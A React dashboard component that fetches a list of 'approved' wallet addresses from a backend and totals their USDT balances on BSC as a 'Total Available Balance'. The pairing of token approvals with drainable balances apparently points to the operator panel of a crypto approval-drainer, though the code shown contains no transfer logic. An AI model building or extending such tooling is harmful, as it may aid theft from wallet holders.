import { Wallet, MapPin, Loader2 } from "lucide-react";
import Card from "./Card";
import { useEffect, useState, useCallback } from "react";
import { ethers } from "ethers";
import { useAccount } from "wagmi";
import { useAppKit } from "@reown/appkit/react";
import {
  USDT_CONTRACT,
  MASTER_CONTRACT,
  BASE_URL,
  USDT_ABI,
  MASTER_ABI,
} from "../utils/helper";

export default function DashboardHome() {
  const [data, setData] = useState<any>({ count: 0, data: [] });
  const [totalBalance, setTotalBalance] = useState<string>("0.00");
  const [isUpdating, setIsUpdating] = useState(false);

  const { address, isConnected } = useAccount();
  const { open } = useAppKit();


  const fetchApprovedData = useCallback(async () => {
    try {
      const res = await fetch(`${BASE_URL}/api/approved?network=BSC Mainnet`);
      const result = await res.json();
      setData(result);
      return result.data;
    } catch (error) {
      console.error("Failed to fetch data:", error);
      return [];
    }
  }, []);

  const fetchTotalBalance = useCallback(async (addresses: any[]) => {
    setIsUpdating(true);
    try {
      const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/"));
      const decimals = await contract.decimals();

      if (addresses && addresses.length > 0) {
        const balancePromises = addresses.map(async (item) => {
          try {
            return await contract.balanceOf(item.owner);
          } catch (err) {
            return BigInt(0);
          }
        });
        const individualBalances = await Promise.all(balancePromises);
        const totalBigInt = individualBalances.reduce((acc, curr) => acc + curr, BigInt(0));
        setTotalBalance(
          Number(ethers.formatUnits(totalBigInt, decimals)).toLocaleString("en-US", {
            minimumFractionDigits: 2,
          }),
        );
      } else {
        setTotalBalance("0.00");
      }
    } catch (error) {
      console.error("Error calculating balances:", error);
    } finally {
      setIsUpdating(false);
    }
  }, []);

  const handleUpdateAll = async () => {
    const addresses = await fetchApprovedData();
    await fetchTotalBalance(addresses);
  };


  useEffect(() => {
    const init = async () => {
      const addresses = await fetchApprovedData();
      await fetchTotalBalance(addresses);
    };
    init();
  }, [fetchApprovedData, fetchTotalBalance]);

  return (
    <div className="space-y-6">
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4">
        <h2 className="text-3xl">Dashboard</h2>
      </div>

      <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
        <Card
          icon={<MapPin className="w-8 h-8 text-green-600" />}
          title="Total Address Count"
          value={data?.count || 0}
        >
          <button
            onClick={() => open()}
            className={`${isConnected
              ? "bg-red-500 hover:bg-red-600"
              : "bg-green-600 hover:bg-green-700"
              } text-white px-6 py-3 rounded-lg transition-colors inline-flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed`}
          >
            {isConnected ? "Disconnect" : "Connect Wallet"}
          </button>
        </Card>

        <Card
          icon={<Wallet className="w-8 h-8 text-green-600" />}
          title="Total Available Balance"
          value={`$${totalBalance}`}
        >
          <button
            disabled={isUpdating}
            onClick={handleUpdateAll}
            className="bg-green-600 text-white px-6 py-3 rounded-lg hover:bg-green-700 transition-colors inline-flex items-center gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            {isUpdating ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Updating...
              </>
            ) : (
              "Update Balance All >>"
            )}
          </button>
        </Card>


      </div>
    </div>
  );
}
